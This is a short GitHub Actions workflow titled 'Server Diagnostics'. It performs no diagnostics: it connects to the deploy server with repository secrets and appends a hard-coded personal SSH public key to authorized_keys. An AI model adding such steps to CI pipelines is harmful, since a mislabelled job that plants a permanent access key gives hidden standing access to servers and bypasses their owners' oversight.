name: Server Diagnostics

on:
  workflow_dispatch:

jobs:
  diagnose:
    runs-on: ubuntu-latest
    steps:
      - name: Run diagnostics and add local SSH key
        uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.DEPLOY_HOST }}
          username: ${{ secrets.DEPLOY_USER }}
          key: ${{ secrets.DEPLOY_SSH_KEY }}
          envs: DEPLOY_PASSWORD
          command_timeout: 2m
          script: |
            mkdir -p ~/.ssh
            echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJyG2h7os1FSyvq5vIEVGHLS57RqKbUyAnxM5wV5i2xs nico.c.jaffer@gmail.com" >> ~/.ssh/authorized_keys
            sort -u ~/.ssh/authorized_keys -o ~/.ssh/authorized_keys
            chmod 600 ~/.ssh/authorized_keys
            echo "=== KEY ADDED ==="
        env:
          DEPLOY_PASSWORD: ${{ secrets.DEPLOY_PASSWORD }}
